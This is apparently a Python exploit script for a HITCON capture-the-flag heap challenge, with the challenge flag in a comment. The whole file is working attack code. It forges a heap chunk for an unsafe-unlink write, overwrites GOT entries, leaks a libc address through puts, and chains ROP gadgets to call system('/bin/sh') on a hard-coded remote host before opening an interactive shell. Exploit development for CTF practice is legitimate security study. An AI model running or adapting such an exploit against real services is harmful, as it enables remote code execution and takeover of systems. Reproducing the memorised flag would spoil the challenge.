from pwnlib import *

# hitcon{The73 1s a s3C7e+ In malloc.c, h4ve y0u f0Und It?:P}

LOCAL = False

SMALL = 1
BIG = 2
HUGE = 3

def c():
	print "c"
	return s.ru("3. Renew secret")

def make(typ, secret="mysecret"):
	print "make"
	s.send("1\n")
	s.ru("Huge secret")
	s.send("%d\n" % typ)
	s.ru("Tell me your secret:")
	s.send(secret + "\n")
	c()

def free(typ=1):
	print "free"
	s.send("2\n")
	s.ru("3. Huge secret")
	s.send("%d\n" % typ)
	c()
	
def edit(typ, secret):
	print "edit"
	s.send("3\n")
	s.ru("Huge secret")
	s.send("%d\n" % typ)
	s.ru("Tell me your secret:")
	s.send(secret + "\n")
	c()


payload  = ""

# fake chunk:
payload += pq(0) # PREV_SIZE
payload += pq(0x21) # SIZE
payload += pq(0x6020a8 - 0x18) # next
payload += pq(0x6020b0 - 0x10) # prev




payload += pq(0x20) # PREV_SIZE
payload += pq(0x90) # SIZE


# next chunk must appear valid
payload += pq(0x91)*(0xc0*2/8) 



if LOCAL:
	s = Socket(("localhost", 5553))
else:
	s = Socket(("52.68.31.117", 5566))
	system_offset = 0x45380
	puts_offset = 0x6f5d0
	bin_sh_offset = 1623435


make(HUGE)
free(HUGE)
make(SMALL)
free(SMALL)
make(HUGE)
free(SMALL)

### now the heap is clean.

make(SMALL)
make(BIG)
edit(HUGE, payload)

free(BIG)

target = 0x602028 # stackchkfail, then memset@got


edit(SMALL, "A"*0x20 + pq(target))

payload = pq(0x400dfc) + pq(0x400bce)


edit(SMALL, payload)


raw_input("rop? ")

pop_rdi = 0x0000000000400e03

payload  = ""
payload += pq(pop_rdi)
payload += pq(0x602020)
payload += pq(0x4006c0)
payload += pq(0x400d15)

s.send(payload)
s.recv()

puts = uq(s.recv().ljust(8, chr(0)))
print "puts: 0x%x" % puts
libc_base = puts - puts_offset
print "libc: 0x%x" % libc_base
system = libc_base + system_offset
bin_sh = libc_base + bin_sh_offset



raw_input("rop2? ")

payload = "A"*0x10
payload += pq(pop_rdi)
payload += pq(bin_sh)
payload += pq(system)


s.send(payload)





s.interact()
